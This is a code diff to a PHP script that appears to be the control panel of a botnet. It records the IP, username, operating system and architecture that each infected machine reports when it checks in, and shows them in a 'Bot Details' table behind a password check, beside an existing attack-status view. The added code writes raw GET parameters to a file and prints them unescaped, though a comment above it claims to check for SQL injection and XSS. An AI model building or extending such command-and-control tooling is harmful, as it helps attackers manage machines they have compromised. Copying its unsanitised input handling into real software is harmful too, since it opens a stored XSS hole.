@@ -58,7 +58,7 @@ if($_GET['p'] == "bot") {
 		$curBot = explode(" ", $botsContent[$i]);
 		// if current bot already in list update timestamp
 		if($curBot[0] == $clientIpAddress) {
-			$botsContent[$i] = $clientIpAddress." ".$timestamp;
+			$botsContent[$i] = $clientIpAddress." ".$timestamp." ".$_GET['os']." ".$_GET['username']." ".$_GET['version']." ".$_GET['osdetail']." ".$_GET['architecture'];
 			$writeBotsContent = $writeBotsContent.$botsContent[$i]."\n";
 			$botInList = 1;
 		}
@@ -72,7 +72,8 @@ if($_GET['p'] == "bot") {
 	}
 
 	if ($botInList == 0) {
-		$writeBotsContent = $writeBotsContent.$clientIpAddress." ".$timestamp;
+		// check for sqli/xss
+		$writeBotsContent = $writeBotsContent.$clientIpAddress." ".$timestamp." ".$_GET['os']." ".$_GET['username']." ".$_GET['version']." ".$_GET['osdetail']." ".$_GET['architecture'];
 	}
 
 	$writeBots = fopen($botFile, "w");
@@ -233,6 +234,34 @@ elseif(hash("sha512", $_GET['p']) == $curPw) {
 	print "</tr></table>";
         print "</form>";
 	print "</div>";
+
+	print "<h3>Bot Details</h3>";
+        print "<div>";
+	print "<table border=\"1\" class=\"attackStatusTable\" cellspacing=\"0\">";
+
+	$allBots = fopen($botFile, "r");
+        $allBotsContent = fread($allBots, filesize($botFile));
+        fclose($bots);
+	$allBotsContent = explode("\n", $allBotsContent);
+
+	print "<tr><td class=\"attackStatusHead\">IP</td><td class=\"attackStatusHead\">System Name</td><td class=\"attackStatusHead\">Operating System</td><td class=\"attackStatusHead\">Architecture</td></tr>";
+	for($i = 0; $i < count($allBotsContent)-1; $i++) {
+		$curBot = explode(" ", $allBotsContent[$i]);
+        	print "<tr><td class=\"attackStatusColumn\" width=\"25%\">".$curBot[0]."</td>";
+        	print "<td class=\"attackStatusColumn\">";
+		print $curBot[3];
+		print "</td>";
+		print "<td class=\"attackStatusColumn\">";
+        	print $curBot[2]." ".$curBot[4]." (".$curBot[5].")";
+        	print "</td>";
+		print "<td class=\"attackStatusColumn\">";
+        	print $curBot[6];
+        	print "</td>";
+	}
+
+        print "</table>";
+	print "</div>";
+
 	print "</div>";
 	print "</div>";
 
